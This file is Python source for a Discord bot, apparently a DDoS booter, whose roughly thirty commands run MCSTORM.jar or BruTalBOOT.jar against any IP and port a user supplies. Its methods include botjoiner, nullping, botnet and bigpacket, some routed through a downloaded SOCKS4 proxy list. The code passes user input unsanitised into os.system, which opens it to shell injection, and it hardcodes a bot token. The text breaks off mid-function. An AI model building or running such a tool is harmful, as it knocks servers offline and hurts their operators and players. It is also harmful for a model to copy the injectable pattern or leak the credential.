import discord
from discord.ext import commands
import os
import threading
import requests
import urllib.request
import json
import asyncio
import sqlite3

token = "MTA5ODAwODcyNzA2OTY2NzQ0OQ.GqQaQ-.0QqN-5UYza9zAR8VKr3K913IZhBbPZxGM29iWw"

intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.message_content = True  # Enable message content intent

client = commands.Bot(command_prefix='.', intents=intents)
client.remove_command('help')


@client.event
async def on_ready():
    os.system('color a')
    print("     $$$$$$$$\           $$\       $$$$$$$\                        $$\     ")
    print("     \__$$  __|          $$ |      $$  __$$\                       $$ |    ")
    print("        $$ |    $$$$$$\  $$ |  $$\ $$ |  $$ | $$$$$$\   $$$$$$\  $$$$$$\   ")
    print("        $$ |   $$  __$$\ $$ | $$  |$$$$$$$\ |$$  __$$\ $$  __$$\ \_$$  _|  ")
    print("        $$ |   $$$$$$$$ |$$$$$$  / $$  __$$\ $$ /  $$ |$$ /  $$ |  $$ |    ") 
    print("        $$ |   $$   ____|$$  _$$<  $$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |$$\ ")
    print("        $$ |   \$$$$$$$\ $$ | \$$\ $$$$$$$  |\$$$$$$  |\$$$$$$  |  \$$$$  |")
    print("        \__|    \_______|\__|  \__|\_______/  \______/  \______/    \____/ ")
    
    print(" |  Discord:MadAce#8547     Discord:https://discord.gg/jbvfs5gV6F    Create By MadAce | ")                  

@client.command()
async def proxy(ctx):
    def update():
        os.system('rm proxies.txt')
        os.system('wget https://api.openproxylist.xyz/socks4.txt')

    t1 = threading.Thread(target=update)

    t1.start()

    await ctx.send("Proxy Updated")


@client.command()
async def botjoiner(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} botjoiner 100 -1")
        os.system(f"")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='Botjoiner', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
@commands.has_permissions(manage_messages=True)
async def maybe(ctx):
    os.system("stop 'py'")
    embed = discord.Embed(
        title='Attack Stopped!',
        description=f'All Attack stopped successfully!',
        color=discord.Colour.blue()
    )

    await ctx.send(embed=embed)


@client.command()
async def spamjoin(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} spamjoin 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='spamjoin', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def spoof(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} spoof 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='spoof', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def ultimatesmasher(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} ultimatesmasher 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='ultimatesmasher', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def tcpbypass(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} tcpbypass 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='tcpbypass', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def help(ctx):
    embed = discord.Embed(
        title="Methods",
        color=discord.Colour.green()
    )
    embed.add_field(name='botjoiner', value='.botjoiner <adress> <port> <protocol>')
    embed.add_field(name='join', value='.join <adress> <port> <protocol>')
    embed.add_field(name='ultimatesmasher', value='.ultimatesmasher <adress> <port> <protocol>')
    embed.add_field(name='spoof', value='.spoof <adress> <port> <protocol>')
    embed.add_field(name='bigpacket', value='.bigpacket <adress> <port> <protocol>')
    embed.add_field(name='tcpbypass', value='.tcpbypass <adress> <port> <protocol>')
    embed.add_field(name='network', value='.network <adress> <port> <protocol>')
    embed.add_field(name='extremejoin', value='.extremejoin <adress> <port> <protocol>')
    embed.add_field(name='resolver', value='.resolve <adress> <port> <protocol>')
    embed.add_field(name='handshake', value='.handshake <adress> <port> <protocol>')
    embed.add_field(name='bighandshake', value='.bighandshake <adress> <port> <protocol>')
    embed.add_field(name='query', value='.query <adress> <port> <protocol>')
    embed.add_field(name='randombytes', value='.random <adress> <port> <protocol>')
    embed.add_field(name='nettydowner', value='.nettydowner <adress> <port> <protocol>')
    embed.add_field(name='ram', value='.ram <adress> <port> <protocol>')
    embed.add_field(name='yoonikscry', value='.yoonikscry <adress> <port> <protocol>')
    embed.add_field(name='colorcrasher', value='.colorcrasher <adress> <port> <protocol>')
    embed.add_field(name='tcphit', value='.tcphit <adress> <port> <protocol>')
    embed.add_field(name='queue', value='.queue <adress> <port> <protocol>')
    embed.add_field(name='ServerFucker', value='.sf <adress> <port> <protocol>')
    embed.add_field(name='nabcry', value='.nabcry <adress> <port> <protocol>')
    embed.add_field(name='longnames', value='.longnames <adress> <port> <protocol>')
    embed.add_field(name='multikiller', value='.multikiller <adress> <port> <protocol>')
    embed.add_field(name='localhost', value='.localhost <adress> <port> <protocol>')
    embed.add_field(name='invalidnames', value='.invalidnames <adress> <port> <protocol>')
    embed.add_field(name='ping', value='.ping <adress> <port> <protocol>')
    embed.set_footer(text="")
    await ctx.send(embed=embed)


@client.command()
async def resolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="Resolved!",
        color=discord.Colour.blue()
    )

    embed.add_field(name='IP:', value=json_object["ip"], inline=False)
    embed.add_field(name='Port:', value=json_object["port"], inline=False)
    embed.add_field(name="Hostname:", value=json_object["hostname"], inline=False)
    embed.add_field(name="Server Online:", value=json_object["online"], inline=False)

    g = json_object["ip"]
    gb = json_object["port"]

    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")
    await ctx.send(embed=embed)


@client.command()
async def handshake(ctx, arg1, arg2):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} 47 handshake 100 -1")
        os.system(f"")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='botjoiner', inline=False)
    embed.add_field(name='protocol:', value=f'1.8', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def network(ctx, arg1, arg2):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} 47 network 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='network', inline=False)
    embed.add_field(name='protocol:', value='47', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()

    await ctx.send(embed=embed)


@client.command()
async def bigpacket(ctx, arg1, arg2):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} 47 bigpacket 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='Bigpacket', inline=False)
    embed.add_field(name='protocol:', value='47', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def extremejoin(ctx, arg1, arg2):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} 47 extremejoin 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='Extremejoin', inline=False)
    embed.add_field(name='protocol:', value='47', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)
 

@client.command()
async def nullping(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} nullping 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='nullping', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def bighandshake(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} bighandshake 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='bighandshake', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def query(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} query 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='query', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def randombytes(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} randombytes 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='randombytes', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def nettydowner(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} nettydowner 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='nettydowner', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def ram(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} ram 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='ram', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def yoonikscry(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} yoonikscry 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='yoonikscry', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def colorcrasher(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} colorcrasher 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='colorcrasher', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def tcphit(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} tcphit 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='tcphit', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def queue(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} queue 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='queue', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def botnet(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} botnet 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='botnet', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def nabcry(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} nabcry 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='nabcry', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def sf(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} sf 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='ServerFucker', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def join(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} join 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='join', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def longnames(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} longnames 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='longnames', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def multikiller(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} multikiller 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='multikiller', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def invalidnames(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} invalidnames 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='invalidnames', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def ping(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} ping 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='ping', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()


@client.command()
async def attack(ctx, arg1, arg2, arg3, arg4):
    def attack():
        os.system(
            f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar {arg1}:{arg2} {arg3} {arg4} 100 -1")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value=f'{arg4}', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/928588202313400320/937842593570623508/putin.gif')
    embed.set_image(url=f'https://media.giphy.com/media/ilybm4KzwjwQAap0gy/giphy.gif')
    embed.set_footer(text="")

    t1 = threading.Thread(target=attack)

    t1.start()
    await ctx.send(embed=embed)


@client.command()
async def boot(ctx, arg1, arg2, arg3, arg4):
    def attack():
        os.system(
            f"java -jar BruTalBOOT.jar {arg1} {arg2} 1 {arg3} {arg4} 1000 1000 100 10 proxies.txt socks4")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.blue()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='method', value=f'{arg2}', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(
